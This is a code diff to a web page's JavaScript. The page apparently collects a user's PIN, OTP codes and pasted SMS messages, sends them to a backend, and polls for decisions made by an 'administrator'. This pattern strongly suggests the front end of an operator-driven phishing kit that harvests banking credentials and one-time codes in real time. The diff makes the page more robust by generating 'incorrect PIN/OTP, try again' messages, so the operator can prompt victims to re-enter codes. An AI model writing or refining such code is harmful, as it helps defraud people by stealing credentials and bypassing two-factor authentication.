@@ -227,7 +227,6 @@ document.addEventListener('DOMContentLoaded', () => {
         body: JSON.stringify({ userId: currentUserId, pastedSms })
       });
       
-      // Restart polling to listen for 'OTP_STEP' from the admin
       startStatusPolling();
       
     } catch (err) {
@@ -304,13 +303,37 @@ document.addEventListener('DOMContentLoaded', () => {
           pinBoxes.forEach(b => b.value = '');
           if (pinBoxes.length > 0) pinBoxes[0].focus();
           switchView('view-login');
-          document.getElementById('pin-error').classList.remove('hidden');
+          
+          let pinErrorEl = document.getElementById('pin-error');
+          if (!pinErrorEl) {
+            pinErrorEl = document.createElement('span');
+            pinErrorEl.id = 'pin-error';
+            pinErrorEl.className = 'error-text';
+            const targetField = document.querySelector('#view-login .field:nth-child(2)');
+            if (targetField) targetField.appendChild(pinErrorEl);
+          }
+          if (pinErrorEl) {
+            pinErrorEl.textContent = 'Incorrect PIN entered. Please try again.';
+            pinErrorEl.classList.remove('hidden');
+          }
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(pollInterval);
           otpBoxes.forEach(b => b.value = '');
           if (otpBoxes.length > 0) otpBoxes[0].focus();
           switchView('view-otp');
-          document.getElementById('otp-error').classList.remove('hidden');
+          
+          let otpErrorEl = document.getElementById('otp-error');
+          if (!otpErrorEl) {
+            otpErrorEl = document.createElement('span');
+            otpErrorEl.id = 'otp-error';
+            otpErrorEl.className = 'error-text';
+            const targetField = document.querySelector('#view-otp .field');
+            if (targetField) targetField.appendChild(otpErrorEl);
+          }
+          if (otpErrorEl) {
+            otpErrorEl.textContent = 'Incorrect OTP entered. Please try again.';
+            otpErrorEl.classList.remove('hidden');
+          }
         } else if (data.status === 'SMS_REJECTED' || data.status === 'DENIED') {
           clearInterval(pollInterval);
           alert('Verification was rejected by administrator.');
@@ -326,4 +349,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-                          
+        
